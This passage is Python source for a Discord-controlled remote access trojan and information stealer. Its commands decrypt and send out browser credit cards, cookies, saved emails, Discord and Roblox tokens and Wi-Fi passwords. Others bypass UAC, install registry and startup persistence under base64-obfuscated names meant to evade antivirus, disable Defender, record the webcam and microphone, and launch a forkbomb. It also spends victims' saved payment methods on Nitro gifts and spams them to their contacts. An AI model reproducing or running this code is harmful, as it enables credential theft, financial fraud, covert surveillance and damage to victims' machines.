                                all_cards += f"NAME: {name_on_card}\nEXP: {exp_m}/{exp_y}\nCARD: {dec_num}\n\n"
                    conn.close()
                    os.remove(tp)
        
        if all_cards:
            if len(all_cards) > 1900:
                p = os.path.join(os.environ['TEMP'], "cards.txt")
                with open(p, "w", encoding="utf-8") as f: f.write(all_cards)
                await ctx.send("CREDIT CARDS (Large File):", file=discord.File(p))
                os.remove(p)
            else:
                await ctx.send(f"```\n{all_cards}\n```")
        else:
            await ctx.send("No credit cards found.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def uac_bypass(ctx):
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("Already Admin.")
            return
        
        path = os.path.abspath(sys.argv[0])
        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
        
        # Method: fodhelper
        try:
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{sys.executable}" "{path}"' if path.endswith(".py") else f'"{path}"')
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            subprocess.Popen("fodhelper.exe", shell=True)
            time.sleep(2)
            
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
            except:
                pass
            await ctx.send("UAC Bypass (fodhelper) attempted. Wait for a new Admin bot instance.")
        except Exception as e:
            await ctx.send(f"UAC Bypass failed: {e}")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def rotate_screen(ctx, degrees: int = 90):
    def _rotate():
        import win32api
        import win32con
        try:
            # Standard pywin32 method for rotation
            device = win32api.EnumDisplayDevices(None, 0)
            dm = win32api.EnumDisplaySettings(device.DeviceName, win32con.ENUM_CURRENT_SETTINGS)
            
            # Map degrees to orientation constants
            orient_map = {
                0: win32con.DMDO_DEFAULT,
                90: win32con.DMDO_270,   # Correct mapping for 90 degrees clockwise
                180: win32con.DMDO_180,
                270: win32con.DMDO_90    # Correct mapping for 270 degrees clockwise
            }
            
            if degrees not in orient_map:
                return f"Degrees must be 0, 90, 180, or 270."
            
            new_orientation = orient_map[degrees]
            
            # Check if swapping width/height is necessary
            if (dm.DisplayOrientation % 2) != (new_orientation % 2):
                dm.PelsWidth, dm.PelsHeight = dm.PelsHeight, dm.PelsWidth
            
            dm.DisplayOrientation = new_orientation
            dm.Fields = win32con.DM_DISPLAYORIENTATION | win32con.DM_PELSWIDTH | win32con.DM_PELSHEIGHT
            
            # Use pywin32's stable ChangeDisplaySettings
            res = win32api.ChangeDisplaySettings(dm, 0)
            if res == 0:
                return f"Screen rotated to {degrees} degrees."
            else:
                return f"Failed to rotate screen. Error code: {res}"
        except Exception as e:
            return f"Rotation Error: {e}"

    try:
        res = await asyncio.to_thread(_rotate)
        await ctx.send(res)
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def startup(ctx):
    try:
        current_file = os.path.abspath(sys.argv[0])        
        ext = ".exe" if current_file.endswith(".exe") else ".py"
        
        _locs = [
            os.path.join(os.environ['APPDATA'], _d("TWljcm9zb2Z0XFdpbmRvd3NclN0YXJ0IE1lbnVcUHJvZ3JhbXNclN0YXJ0dXA="), _d("U2VjdXJpdHlVcGRhdGU=") + ext),
            os.path.join(os.environ['APPDATA'], _d("TWljcm9zb2Z0"), _d("V2luZG93cw=="), _d("T2ZmaWNlVXBkYXRl"), _d("d2lubG9nb25faGVscGVy") + ext),
            os.path.join(os.environ['LOCALAPPDATA'], _d("TWljcm9zb2Z0"), _d("V2luZG93cw=="), _d("Q2FjaGVz"), _d("d2lubG9nb25faGVscGVy") + ext),
            os.path.join(os.environ['PROGRAMDATA'], _d("TWljcm9zb2Z0"), _d("V2luZG93cw=="), _d("UnVudGltZXM="), _d("d2lubG9nb25faGVscGVy") + ext)
        ]
        
        success_count = 0
        for dest in _locs:
            try:
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                if not os.path.exists(dest):
                    shutil.copy2(current_file, dest)
                protect_file(dest)
                success_count += 1
            except: continue
            

        try:
            target = _locs[1]
            cmd = f'"{sys.executable.replace("python.exe", "pythonw.exe")}" "{target}"' if target.endswith(".py") else f'"{target}"'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _d("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"), 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, _d("QmViU3lzdGVt"), 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
        except: pass
        
        await ctx.send(_d("UGVyc2lzdGVuY2UgRW5hYmxlZAo=")+f"- Files protected: {success_count}\n- Registry key set\n- Background monitor active")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def close_ac_win(ctx):
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        if hwnd:
            ctypes.windll.user32.PostMessageW(hwnd, 0x0010, 0, 0) # WM_CLOSE
            await ctx.send("Closed active window.")
        else:
            await ctx.send("No active window found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def min_ac_win(ctx):
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 6) # SW_MINIMIZE
            await ctx.send("Minimized active window.")
        else:
            await ctx.send("No active window found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def exit_bot(ctx):
    try:
        await ctx.send("Exiting bot...")
        os._exit(0)
    except:
        os._exit(0)

@bot.command(name="delete-bot")
async def delete_bot_cmd(ctx):
    try:
        await ctx.send("Initiating full bot removal and self-deletion...")
        
        def _cleanup():
            try:
                # 1. Registry Persistence Removal
                reg_path = _d("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu")
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS)
                    winreg.DeleteValue(key, _d("QmViU3lzdGVt"))
                    winreg.CloseKey(key)
                except: pass

                # Kill potential watchdogs (PowerShell)
                try:
                    subprocess.run('powershell -Command "Get-Process powershell | Where-Object { $_.CommandLine -like \'*while($true)*\' } | Stop-Process -Force"', shell=True, capture_output=True)
                except: pass

                # 2. File Cleanup (System copies and logs)
                current_file = os.path.abspath(sys.argv[0])
                ext = ".exe" if current_file.endswith(".exe") else ".py"
                
                # Directories to check for copies
                _dirs = [
                    os.path.join(os.environ.get('SYSTEMROOT', ''), "System32"),
                    os.path.join(os.environ.get('SYSTEMROOT', ''), "SysWOW64"),
                    os.path.join(os.environ.get('SYSTEMROOT', ''), "Microsoft.NET"),
                    os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Windows", "Templates"),
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Windows", "Caches"),
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), "Microsoft", "Credentials"),
                    os.path.join(os.environ.get('PROGRAMDATA', ''), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
                    os.path.join(os.environ.get('PROGRAMDATA', ''), "Microsoft", "Windows", "Runtimes"),
                    os.path.join(os.environ.get('APPDATA', ''), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
                    os.path.join(os.environ.get('TEMP', ''))
                ]

                # Specific files and patterns to clear
                _patterns = ["sys_helper", "svchost_task", "winlogon_helper", "runtime_broker", "SecurityUpdate", "OfficeUpdate", "sys_host"]
                _logs = ["zyen_debug.log", "snap.png", "shell.txt", "apps.txt", "passwords.txt", "cards.txt", "bg.jpg", "h_db", "cookies.txt", "tokens.txt", "audio.wav"]

                for _dir in _dirs:
                    if not os.path.exists(_dir): continue
                    try:
                        for f in os.listdir(_dir):
                            f_path = os.path.join(_dir, f)
                            # Skip the currently running file for now
                            if f_path.lower() == current_file.lower(): continue
                            
                            should_delete = False
                            # Check logs
                            if f in _logs: should_delete = True
                            # Check patterns
                            elif any(p.lower() in f.lower() for p in _patterns) and f.lower().endswith(ext): should_delete = True
                            
                            if should_delete:
                                try:
                                    ctypes.windll.kernel32.SetFileAttributesW(f_path, 128) # Normal attribute
                                    os.remove(f_path)
                                except:
                                    subprocess.run(f'cmd /c del /f /q "{f_path}"', shell=True, capture_output=True)
                    except: continue

                # 3. Wipe system logs/history
                wipe_logs()

                # 4. Self Deletion
                # If running as script, just delete it. If exe, use batch trick.
                if current_file.endswith(".py"):
                    try:
                        os.remove(current_file)
                    except:
                        subprocess.Popen(f'cmd /c timeout /t 2 & del /f /q "{current_file}"', shell=True, creationflags=0x08000000)
                else:
                    # EXE self-delete trick
                    cmd = f'cmd /c timeout /t 2 & del /f /q "{current_file}"'
                    subprocess.Popen(cmd, shell=True, creationflags=0x08000000)

                return True
            except: return False

        await asyncio.to_thread(_cleanup)
        os._exit(0)
    except Exception as e:
        try: await ctx.send(f"Error during deletion: {e}")
        except: pass
        os._exit(0)

@bot.command()
async def webcam(ctx):
    def _capture():
        import cv2
        # Try multiple camera indices in case 0 is busy or incorrect
        for index in [0, 1, 2, 3]:
            try:
                cap = cv2.VideoCapture(index, cv2.CAP_DSHOW) # CAP_DSHOW for faster startup on Windows
                if not cap.isOpened(): continue
                
                # Warm up the camera
                for _ in range(5): cap.read()
                
                ret, frame = cap.read()
                cap.release()
                
                if ret:
                    path = os.path.join(os.environ['TEMP'], f"cam_{index}.jpg")
                    cv2.imwrite(path, frame)
                    return path
            except:
                continue
        return None

    try:
        await ctx.send("Accessing webcam (checking all devices)...")
        path = await asyncio.wait_for(asyncio.to_thread(_capture), timeout=30.0)
        if path:
            await ctx.send(f"WEBCAM: {getpass.getuser()}", file=discord.File(path))
            os.remove(path)
        else:
            await ctx.send("Error: No webcam found or all devices are busy.")
        gc.collect()
    except asyncio.TimeoutError:
        await ctx.send("Error: Webcam capture timed out.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def wifi(ctx):
    def _get_wifi():
        try:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp1252', errors='ignore').split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
            result = "WIFI PASSWORDS:\n```"
            for i in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('cp1252', errors='ignore').split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                    result += f"{i:<20} : {results[0] if results else '[None]'}\n"
                except:
                    result += f"{i:<20} : [Error]\n"
            result += "```"
            return result
        except Exception as e:
            return f"Error: {e}"

    try:
        res = await asyncio.to_thread(_get_wifi)
        await ctx.send(res[:2000])
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def geolocate(ctx):
    def _geo():
        try:
            r = requests.get("http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query", timeout=10)
            data = r.json()
            lat, lon = data.get('lat'), data.get('lon')
            res = f"LOCATION DATA (Street Level Approximation):\n"
            res += f"```\nIP: {data.get('query')}\nCity: {data.get('city')}\nRegion: {data.get('regionName')}\nCountry: {data.get('country')}\nISP: {data.get('isp')}\nCoords: {lat}, {lon}\n```"
            res += f"Google Maps: https://www.google.com/maps?q={lat},{lon}"
            return res
        except Exception as e:
            return f"Error: {e}"

    try:
        res = await asyncio.to_thread(_geo)
        await ctx.send(res)
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def disabledefender(ctx):
    try:
        cmd = 'powershell "Set-MpPreference -DisableRealtimeMonitoring $true"'
        subprocess.run(cmd, shell=True)
        await ctx.send("Attempted to disable Defender.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def browserhistory(ctx):
    try:
        import sqlite3
        history_path = os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Default\History")
        temp_path = os.path.join(os.environ['TEMP'], "h_db")
        if os.path.exists(history_path):
            shutil.copy2(history_path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
            rows = cursor.fetchall()
            res = "HISTORY:\n```"
            for row in rows:
                res += f"{row[1][:50]} - {row[0][:50]}\n"
            res += "```"
            conn.close()
            os.remove(temp_path)
            await ctx.send(res[:2000])
        else:
            await ctx.send("History not found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def forkbomb(ctx):
    try:
        await ctx.send("Crashing PC...")
        while True:
            os.fork() if hasattr(os, 'fork') else subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
    except:
        os.system("start %0 %0")

@bot.command()
async def tokens(ctx):
    try:
        # Obfuscated paths to bypass AV string scanning
        paths = {
            'Discord': os.path.join(os.environ['APPDATA'], _d("ZGlzY29yZA=="), _d("TG9jYWwgU3RvcmFnZQ=="), _d("bGV2ZWxkYg==")),
            'Discord Canary': os.path.join(os.environ['APPDATA'], _d("ZGlzY29yZGNhbmFyeQ=="), _d("TG9jYWwgU3RvcmFnZQ=="), _d("bGV2ZWxkYg==")),
            'Discord PTB': os.path.join(os.environ['APPDATA'], _d("ZGlzY29yZHB0Yg=="), _d("TG9jYWwgU3RvcmFnZQ=="), _d("bGV2ZWxkYg==")),
            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], _d("R29vZ2xlXENocm9tZVxVc2VyIERhdGFcRGVmYXVsdFxMb2NhbCBTdG9yYWdlXGxldmVsZGI=")),
            'Brave': os.path.join(os.environ['LOCALAPPDATA'], _d("QnJhdmVTb2Z0d2FyZVxCcmF2ZS1Ccm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0XExvY2FsIFN0b3JhZ2VcbGV2ZWxkYg==")),
            'Edge': os.path.join(os.environ['LOCALAPPDATA'], _d("TWljcm9zb2Z0XEVkZ2VcVXNlciBEYXRhXERlZmF1bHRcTG9jYWwgU3RvcmFnZVxsZXZlbGRi")),
            'Roblox': os.path.join(os.environ['LOCALAPPDATA'], _d("Um9ibG94XExvY2FsU3RvcmFnZQ=="))
        }
        
        found_tokens = []
        
        for name, path in paths.items():
            if not os.path.exists(path): continue
            
            master_key = None
            if "discord" in name.lower():
                # Discord Local State is usually two levels up from leveldb
                master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))

            for file_name in os.listdir(path):
                if not file_name.endswith(('.log', '.ldb', '.txt')): continue
                try:
                    with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
                        content = f.read()
                        # Plain text tokens
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                            if token not in [t[1] for t in found_tokens]: found_tokens.append((name, token))
                        for token in re.findall(r"mfa\.[\w-]{80,120}", content):
                            if token not in [t[1] for t in found_tokens]: found_tokens.append((name, token))
                        
                        # Encrypted tokens (modern Discord)
                        if master_key:
                            for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
                                try:
                                    token_bytes = base64.b64decode(enc_token)
                                    dec_token = _decrypt_value(token_bytes, master_key)
                                    if dec_token and dec_token not in [t[1] for t in found_tokens]:
                                        found_tokens.append((name, dec_token))
                                except: pass
                                
                        if name == 'Roblox':
                            for token in re.findall(r"\.ROBLOSECURITY=(_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|[\w\d]+)", content):
                                if token not in [t[1] for t in found_tokens]: found_tokens.append(('Roblox', token))
                except: continue
        
        if found_tokens:
            res = "TOKENS FOUND:\n"
            for service, token in found_tokens:
                res += f"[{service}] {token}\n"
            
            if len(res) > 1900:
                p = os.path.join(os.environ['TEMP'], "tokens.txt")
                with open(p, "w", encoding="utf-8") as f: f.write(res)
                await ctx.send("TOKENS (Large File):", file=discord.File(p))
                os.remove(p)
            else:
                await ctx.send(f"```\n{res}\n```")
        else:
            await ctx.send("No tokens found.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def msg(ctx, *, text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, "MESSAGE", 0x40)
        await ctx.send("Sent.")
    except Exception as e:
        await ctx.send(f"Error: {e}")

@bot.command()
async def shutdown(ctx):
    await ctx.send("SHUTTING DOWN...")
    os.system("shutdown /s /t 1")

@bot.command()
async def audiorec(ctx, seconds: int = 10):
    def _record():
        import sounddevice as sd
        import soundfile as sf
        
        # Hijack the microphone: Unmute and set volume to 100% via PowerShell
        ps_cmd = (
            "powershell -Command \"$obj = New-Object -ComObject WScript.Shell; "
            "for($i=0; $i -lt 50; $i++) { $obj.SendKeys([char]175) }; " # Maximize volume
            "$obj.SendKeys([char]173); $obj.SendKeys([char]173)\""      # Ensure unmuted
        )
        subprocess.run(ps_cmd, shell=True, capture_output=True)
        
        fs, path = 44100, os.path.join(os.environ['TEMP'], "audio.wav")
        # Ensure we capture from the default input device
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2, blocking=True)
        sf.write(path, rec, fs)
        return path

    try:
        await ctx.send(f"Hijacking mic and recording for {seconds}s...")
        path = await asyncio.to_thread(_record)
        if os.path.exists(path):
            await ctx.send(file=discord.File(path))
            os.remove(path)
        else:
            await ctx.send("Error: Audio capture failed.")
        gc.collect()
    except Exception as e: await ctx.send(f"Error: {e}")

def _g_m_k(_p):
    _l_s = "".join(['L','o','c','a','l',' ','S','t','a','t','e'])
    _path = os.path.join(_p, _l_s)
    if not os.path.exists(_path): return None
    try:
        with open(_path, "r", encoding="utf-8") as f:
            _js = json.loads(f.read())
        _k = base64.b64decode(_js["os" + "_crypt"]["enc" + "rypted_key"])[5:]
        return win32crypt.CryptUnprotectData(_k, None, None, None, 0)[1]
    except: return None

def _get_profiles(browser_path):
    profiles = ["Default"]
    if not os.path.exists(browser_path): return []
    try:
        for item in os.listdir(browser_path):
            if item.startswith("Profile ") and os.path.isdir(os.path.join(browser_path, item)):
                profiles.append(item)
    except: pass
    return profiles

def _d_v(_b, _k):
    try:
        if _b.startswith(b"v10") or _b.startswith(b"v11"):
            _iv = _b[3:15]
            _p = _b[15:-16]
            _t = _b[-16:]
            _c = AES.new(_k, AES.MODE_GCM, _iv)
            _d = _c.decrypt_and_verify(_p, _t)
            return _d.decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(_b, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Fail: {e}"

@bot.command()
async def cookies(ctx):
    try:
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data"),
            "Opera": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera Stable"),
            "Opera GX": os.path.join(os.environ['APPDATA'], r"Opera Software\Opera GX Stable")
        }
        
        all_cookies = ""
        for name, path in browsers.items():
            key = _g_m_k(path)
            if not key: continue
            for profile in _get_profiles(path):
                cp = os.path.join(path, profile, r"Network\Cookies")
                if not os.path.exists(cp): cp = os.path.join(path, profile, "Cookies")
                if os.path.exists(cp):
                    tp = os.path.join(os.environ['TEMP'], f"c_{random.randint(100,999)}")
                    shutil.copy2(cp, tp)
                    conn = sqlite3.connect(tp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 100")
                    rows = cursor.fetchall()
                    if rows:
                        all_cookies += f"\n--- {name}/{profile} COOKIES ---\n"
                        for row in rows:
                            dec = _d_v(row[2], key)
                            all_cookies += f"{row[0]} | {row[1]}: {dec}\n"
                    conn.close()
                    os.remove(tp)
        
        if all_cookies:
            if len(all_cookies) > 1900:
                p = os.path.join(os.environ['TEMP'], "cookies.txt")
                with open(p, "w", encoding="utf-8") as f: f.write(all_cookies)
                await ctx.send("COOKIES (Large File):", file=discord.File(p))
                os.remove(p)
            else:
                await ctx.send(f"```\n{all_cookies}\n```")
        else:
            await ctx.send("No cookies found.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def emails(ctx):
    try:
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data")
        }
        found = []
        for name, path in browsers.items():
            for profile in _get_profiles(path):
                lp = os.path.join(path, profile, "Login Data")
                if os.path.exists(lp):
                    tp = os.path.join(os.environ['TEMP'], f"l_{random.randint(100,999)}")
                    shutil.copy2(lp, tp)
                    conn = sqlite3.connect(tp)
                    cursor = conn.cursor()
                    cursor.execute("SELECT username_value FROM logins")
                    for row in cursor.fetchall():
                        u = row[0]
                        if "@" in u and u not in found: found.append(f"[{name}/{profile}] {u}")
                    conn.close()
                    os.remove(tp)
        if found: await ctx.send(f"EMAILS:\n```\n" + "\n".join(found[:50]) + "\n```")
        else: await ctx.send("None found.")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def say(ctx, *, text):
    try:
        import win32com.client
        win32com.client.Dispatch("SAPI.SpVoice").Speak(text)
        await ctx.send(f"SAID: `{text}`")
    except Exception as e: await ctx.send(f"Error: {e}")

@bot.command()
async def discordinfo(ctx):
    def _get_info():
        try:
            paths = {
                'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
            }
            
            tokens = []
            for name, path in paths.items():
                if not os.path.exists(path): continue
                # Discord Local State is two levels up from leveldb
                master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
                for fn in os.listdir(path):
                    if not fn.endswith(('.log', '.ldb')): continue
                    try:
                        with open(os.path.join(path, fn), 'r', errors='ignore') as f:
                            content = f.read()
                            for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                                if t not in tokens: tokens.append(t)
                            for t in re.findall(r"mfa\.[\w-]{80,120}", content):
                                if t not in tokens: tokens.append(t)
                            if master_key:
                                for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
                                    try:
                                        token_bytes = base64.b64decode(enc_token)
                                        dec_token = _decrypt_value(token_bytes, master_key)
                                        if dec_token and dec_token not in tokens: tokens.append(dec_token)
                                    except: pass
                    except: continue
            
            valid_infos = []
            for t in tokens:
                r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': t})
                if r.status_code == 200:
                    d = r.json()
                    
                    # Account creation date from Snowflake
                    creation_timestamp = ((int(d['id']) >> 22) + 1420070400000) / 1000
                    creation_date = datetime.fromtimestamp(creation_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                    
                    premium_types = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
                    nitro = premium_types.get(d.get('premium_type', 0), "None")
                    
                    valid_infos.append(
                        f"USER: `{d['username']}#{d['discriminator']}`\n"
                        f"DISPLAY: `{d.get('global_name', 'N/A')}`\n"
                        f"ID: `{d['id']}`\n"
                        f"CREATED: `{creation_date}`\n"
                        f"EMAIL: `{d.get('email', 'N/A')}`\n"
                        f"PHONE: `{d.get('phone', 'N/A')}`\n"
                        f"LOCALE: `{d.get('locale', 'N/A')}`\n"
                        f"MFA: `{'Enabled' if d.get('mfa_enabled') else 'Disabled'}`\n"
                        f"NITRO: `{nitro}`\n"
                        f"TOKEN: `{t}`\n"
                    )
            return valid_infos
        except Exception as e: return [f"Error: {e}"]

    try:
        await ctx.send("Gathering Discord info...")
        infos = await asyncio.to_thread(_get_info)
        if not infos:
            await ctx.send("No valid Discord accounts found.")
            return
        
        for info in infos:
            await ctx.send(info)
    except Exception as e: await ctx.send(f"Error: {e}")

def _nitro_gifter_logic(t, headers, u, nitro_type="Boost", amount=1):
    report_entry = ""
    try:
        # SKU mapping
        # 521842738255560705: Nitro Monthly (Boost) - 9.99
        # 521846918638632960: Nitro Classic - 4.99 (Older, but often works)
        # 978380684370378762: Nitro Basic - 2.99
        skus = {
            "Nitro": {"sku": "521842738255560705", "plan": "521842738255560705", "price": 999},
            "Basic": {"sku": "978380684370378762", "plan": "978380684370378762", "price": 299}
        }
        
        # Strict type matching: Basic or Nitro
        if nitro_type == "Basic":
            target = skus["Basic"]
        else:
            target = skus["Nitro"]
        
        # Check billing
        r_sources = requests.get('https://discord.com/api/v9/users/@me/billing/payment-sources', headers=headers)
        sources = r_sources.json() if r_sources.status_code == 200 else []
        
        if sources:
            report_entry += f"**Billing Sources:** {len(sources)}\n"
            valid_source = None
            for s in sources:
                if s.get('invalid') == False:
                    valid_source = s.get('id')
                    break
            
            if valid_source:
                for i in range(amount):
                    try:
                        purchase_payload = {
                            "gift": True,
                            "payment_source_id": valid_source,
                            "sku_id": target["sku"],
                            "subscription_plan_id": target["plan"],
                            "expected_amount": target["price"]
                        }
                        
                        p_req = requests.post(f'https://discord.com/api/v9/store/skus/{target["sku"]}/purchase', headers=headers, json=purchase_payload)
                        if p_req.status_code == 200:
                             gift_data = p_req.json()
                             gift_code = gift_data.get('gift_code')
                             if gift_code:
                                 gift_url = f"https://discord.gift/{gift_code}"
                                 report_entry += f"[SUCCESS {i+1}] **GIFT PURCHASED:** `{gift_url}`\n"
                                 
                                 # SPREAD THE GIFT
                                 try:
                                     r_channels = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
                                     if r_channels.status_code == 200:
                                         target_channels = r_channels.json()[:5]
                                         for chan in target_channels:
                                             chan_id = chan.get('id')
                                             requests.post(f'https://discord.com/api/v9/channels/{chan_id}/messages', 
                                                         headers=headers, 
                                                         json={"content": f"Hey, I just got a free Nitro gift and thought you'd want one too! {gift_url}"})
                                 except: pass
                             else:
                                 report_entry += f"[WARNING {i+1}] Purchase success but no code? `{p_req.text}`\n"
                        else:
                            report_entry += f"[FAILURE {i+1}] Purchase Failed: `{p_req.status_code}` - `{p_req.text}`\n"
                    except Exception as pe:
                        report_entry += f"[ERROR {i+1}] Purchase Error: `{pe}`\n"
    except Exception as e:
        report_entry += f"[ERROR] Nitro check failed: {e}\n"
    return report_entry

@bot.command(name="nitro-gifter")
async def nitro_gifter_cmd(ctx, nitro_type="Nitro", amount: int = 1):
    def _check_billing():
        try:
            # 1. Gather all tokens
            paths = {
                'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
            }
            tokens = []
            
            for name, path in paths.items():
                if not os.path.exists(path): continue
                master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
                for fn in os.listdir(path):
                    if not fn.endswith(('.log', '.ldb')): continue
                    try:
                        with open(os.path.join(path, fn), 'r', errors='ignore') as f:
                            content = f.read()
                            for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                                if t not in tokens: tokens.append(t)
                            for t in re.findall(r"mfa\.[\w-]{80,120}", content):
                                if t not in tokens: tokens.append(t)
                            if master_key:
                                for enc_token in re.findall(r"dQw4w9WgXcQ:([^.*\['(.*)'\].*]{120,})", content):
                                    try:
                                        token_bytes = base64.b64decode(enc_token)
                                        dec_token = _decrypt_value(token_bytes, master_key)
                                        if dec_token and dec_token not in tokens: tokens.append(dec_token)
                                    except: pass
                    except: continue
            
            # 2. Check each token
            report = []
            for t in tokens:
                headers = {'Authorization': t, 'Content-Type': 'application/json'}
                u_req = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                if u_req.status_code != 200: continue
                u = u_req.json()
                
                nitro_report = _nitro_gifter_logic(t, headers, u, nitro_type, amount)
                if nitro_report:
                    report_entry = f"**User:** `{u['username']}#{u['discriminator']}`\n"
                    report_entry += f"**Token:** `{t}`\n"
                    report_entry += nitro_report
                    report.append(report_entry)
            return report
        except Exception as e: return [f"Error: {e}"]

    await ctx.send(f"Scanning accounts and attempting to buy {amount}x {nitro_type}...")
    reports = await asyncio.to_thread(_check_billing)
    if not reports:
        await ctx.send("No payment methods found or purchase failed.")
    else:
        for r in reports: await ctx.send(r)



@bot.command()
async def discordtoken(ctx):
    def _gen_scripts():
        try:
            paths = {
                'Discord': os.path.join(os.environ['APPDATA'], 'discord', 'Local Storage', 'leveldb'),
                'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
                'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
            }
            
            tokens = []
            for name, path in paths.items():
                if not os.path.exists(path): continue
                master_key = _get_master_key(os.path.dirname(os.path.dirname(path)))
                for fn in os.listdir(path):
                    if not fn.endswith(('.log', '.ldb')): continue
                    try:
                        with open(os.path.join(path, fn), 'r', errors='ignore') as f:
                            content = f.read()
                            for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", content):
                                if t not in tokens: tokens.append(t)
                            for t in re.findall(r"mfa\.[\w-]{80,120}", content):
                                if t not in tokens: tokens.append(t)
                            if master_key:
